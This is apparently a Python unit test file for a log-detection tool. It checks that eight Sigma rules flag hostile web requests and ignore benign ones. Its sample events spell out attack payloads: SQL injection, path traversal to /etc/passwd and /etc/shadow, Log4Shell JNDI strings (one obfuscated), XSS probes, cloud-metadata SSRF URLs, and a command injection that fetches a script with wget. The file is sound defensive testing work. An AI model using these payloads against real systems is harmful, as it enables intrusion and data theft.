"""Web Sigma pack: each example loads, matches a hostile request, and stays quiet on a benign one."""

import unittest
from pathlib import Path

from watchpost import rules as rules_mod
from watchpost import sigma

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "web"


def ev(event_type, message, src_ip="203.0.113.80", user="-"):
    return {"event_type": event_type, "user": user, "src_ip": src_ip, "host": "web01", "message": message}


# An ordinary authenticated page view. It must not match any rule in the pack.
BENIGN = ev(
    "web_request",
    "GET /app/reports -> 200 ua=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
    src_ip="10.0.1.23",
    user="alice",
)

CASES = {
    "web_sql_injection.yml": {
        "title": "Web SQL Injection Attempt",
        "rule_id": "sigma_web_sql_injection_attempt",
        "severity": "high",
        "technique": "T1190",
        "tactic": "attack.initial_access",
        "hit": [
            ev("web_scan", "GET /search?q=1%20union%20select%20password%20from%20users -> 404 ua=Mozilla/5.0"),
            ev("web_scan", "GET /index.php?id=1%27%20or%20%271%27=%271 -> 404 ua=Mozilla/5.0"),
            ev("web_scan", "GET /index.php?id=1' or '1'='1 -> 500 ua=Mozilla/5.0"),
        ],
        "miss": [
            ev("web_request", "GET /search?q=select+a+plan -> 200 ua=Mozilla/5.0"),
        ],
    },
    "web_path_traversal.yml": {
        "title": "Web Path Traversal to a Sensitive File",
        "rule_id": "sigma_web_path_traversal_to_a_sensitive_file",
        "severity": "high",
        "technique": "T1190",
        "tactic": "attack.initial_access",
        "hit": [
            ev("web_scan", "GET /../../etc/passwd -> 404 ua=Mozilla/5.0"),
            ev("web_scan", "GET /%2e%2e/%2e%2e/etc/shadow -> 404 ua=Mozilla/5.0"),
            ev("web_scan", "GET /..%2f..%2fetc%2fpasswd -> 404 ua=Mozilla/5.0"),
            ev("web_request", "GET /..\\..\\windows\\win.ini -> 400 ua=Mozilla/5.0"),
        ],
        "miss": [
            ev("web_request", "GET /static/../app.js -> 200 ua=Mozilla/5.0"),
            ev("web_request", "GET /docs/etc/passwd-policy -> 200 ua=Mozilla/5.0"),
        ],
    },
    "web_log4shell_jndi.yml": {
        "title": "Log4Shell JNDI Lookup in a Web Request",
        "rule_id": "sigma_log_shell_jndi_lookup_in_a_web_request",
        "severity": "critical",
        "technique": "T1190",
        "tactic": "attack.initial_access",
        "hit": [
            ev("web_scan", "GET /login -> 200 ua=${jndi:ldap://203.0.113.50/a}"),
            ev("web_scan", "GET /?x=%24%7bjndi%3aldap%3a%2f%2f203.0.113.50%2fa -> 400 ua=Mozilla/5.0"),
            ev("web_request", "GET /login -> 200 ua=${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.50/a"),
        ],
        "miss": [
            ev("web_request", "GET /login?user=jndi -> 200 ua=Mozilla/5.0"),
        ],
    },
    "web_cross_site_scripting.yml": {
        "title": "Web Cross-Site Scripting Probe",
        "rule_id": "sigma_web_cross_site_scripting_probe",
        "severity": "high",
        "technique": "T1190",
        "tactic": "attack.initial_access",
        "hit": [
            ev("web_scan", "GET /search?q=%3cscript%3ealert(1)%3c/script%3e -> 200 ua=Mozilla/5.0"),
            ev("web_scan", "GET /search?q=<script>alert(1)</script> -> 200 ua=Mozilla/5.0"),
        ],
        "miss": [
            ev("web_request", "GET /help/javascript-guide -> 200 ua=Mozilla/5.0"),
        ],
    },
    "web_sensitive_file_wordlist.yml": {
        "title": "Web Sensitive File Wordlist Probe",
        "rule_id": "sigma_web_sensitive_file_wordlist_probe",
        "severity": "medium",
        "technique": "T1595.003",
        "tactic": "attack.reconnaissance",
        "hit": [
            ev("web_scan", "GET /.env -> 404 ua=Mozilla/5.0"),
            ev("web_scan", "GET /.env?x=1 -> 404 ua=Mozilla/5.0"),
            ev("web_scan", "GET /.git/config -> 404 ua=Mozilla/5.0"),
            ev("web_scan", "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php -> 404 ua=Mozilla/5.0"),
        ],
        "miss": [
            ev("web_request", "GET /app/environment -> 200 ua=Mozilla/5.0"),
            ev("web_request", "GET /.environment -> 200 ua=Mozilla/5.0"),
            ev("web_request", "GET /.github -> 200 ua=Mozilla/5.0"),
            ev("web_request", "GET /vendor/phpunit-bridge -> 200 ua=Mozilla/5.0"),
        ],
    },
    "web_vulnerability_scanner_user_agent.yml": {
        "title": "Web Vulnerability Scanner User-Agent",
        "rule_id": "sigma_web_vulnerability_scanner_user_agent",
        "severity": "medium",
        "technique": "T1595.002",
        "tactic": "attack.reconnaissance",
        "hit": [
            ev("web_scan", "GET / -> 200 ua=Mozilla/5.00 (Nikto/2.5.0) SYNTHETIC"),
            ev("web_scan", "GET / -> 404 ua=sqlmap/1.7.8#stable"),
        ],
        "miss": [
            ev("web_request", "GET /blog/nikto-vs-nmap -> 200 ua=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"),
        ],
    },
    "web_cloud_metadata_ssrf.yml": {
        "title": "Web Request for Cloud Instance Metadata",
        "rule_id": "sigma_web_request_for_cloud_instance_metadata",
        "severity": "high",
        "technique": "T1190",
        "tactic": "attack.initial_access",
        "hit": [
            ev("web_request", "GET /fetch?url=http://169.254.169.254/latest/meta-data/ -> 200 ua=Mozilla/5.0"),
            ev("web_request", "GET /proxy?u=http://metadata.google.internal/computeMetadata/v1/ -> 200 ua=Mozilla/5.0"),
        ],
        "miss": [
            ev("web_request", "GET /latest/releases -> 200 ua=Mozilla/5.0"),
            ev("web_request", "GET /api/metadata -> 200 ua=Mozilla/5.0"),
        ],
    },
    "web_command_injection.yml": {
        "title": "Web Command Injection Attempt",
        "rule_id": "sigma_web_command_injection_attempt",
        "severity": "high",
        "technique": "T1190",
        "tactic": "attack.initial_access",
        "hit": [
            ev("web_error", "GET /api/search?q=1;wget%20http://203.0.113.50/x.sh -> 500 ua=Mozilla/5.0"),
            ev("web_request", "GET /api/search?q=1%3bwget+http://203.0.113.50/x.sh -> 200 ua=Mozilla/5.0"),
        ],
        "miss": [
            ev("web_request", "GET /docs/curl-and-wget -> 200 ua=Mozilla/5.0"),
        ],
    },
}


class WebSigmaPackTests(unittest.TestCase):
    def test_pack_is_these_eight_rules(self):
        found = sorted(p.name for p in PACK.glob("*.yml"))
        self.assertEqual(found, sorted(CASES))

    def check(self, name):
        case = CASES[name]
        compiled = sigma.compile_rule((PACK / name).read_text(encoding="utf-8"))
        self.assertEqual(compiled["title"], case["title"])
        self.assertEqual(compiled["rule_id"], case["rule_id"])
        self.assertEqual(compiled["severity"], case["severity"])
        self.assertEqual([t["id"] for t in compiled["techniques"]], [case["technique"]])
        self.assertNotIn(compiled["rule_id"], rules_mod.RULE_FUNCTIONS)
        self.assertEqual(compiled["warnings"], [
            "tags not mapped to the ATT&CK catalog (kept out of coverage): " + case["tactic"],
            "logsource is informational only: the rule runs on every stored event",
        ])
        params = compiled["params"]
        for event in case["hit"]:
            self.assertTrue(sigma.matches(params, event), event["message"])
        for event in [BENIGN, *case["miss"]]:
            self.assertFalse(sigma.matches(params, event), event["message"])
        foreign = dict(case["hit"][0])
        foreign["event_type"] = "syslog"
        self.assertFalse(sigma.matches(params, foreign), foreign["message"])

    def test_sql_injection(self):
        self.check("web_sql_injection.yml")

    def test_path_traversal(self):
        self.check("web_path_traversal.yml")

    def test_log4shell(self):
        self.check("web_log4shell_jndi.yml")

    def test_cross_site_scripting(self):
        self.check("web_cross_site_scripting.yml")

    def test_sensitive_file_wordlist(self):
        self.check("web_sensitive_file_wordlist.yml")

    def test_vulnerability_scanner_user_agent(self):
        self.check("web_vulnerability_scanner_user_agent.yml")

    def test_cloud_metadata_ssrf(self):
        self.check("web_cloud_metadata_ssrf.yml")

    def test_command_injection(self):
        self.check("web_command_injection.yml")
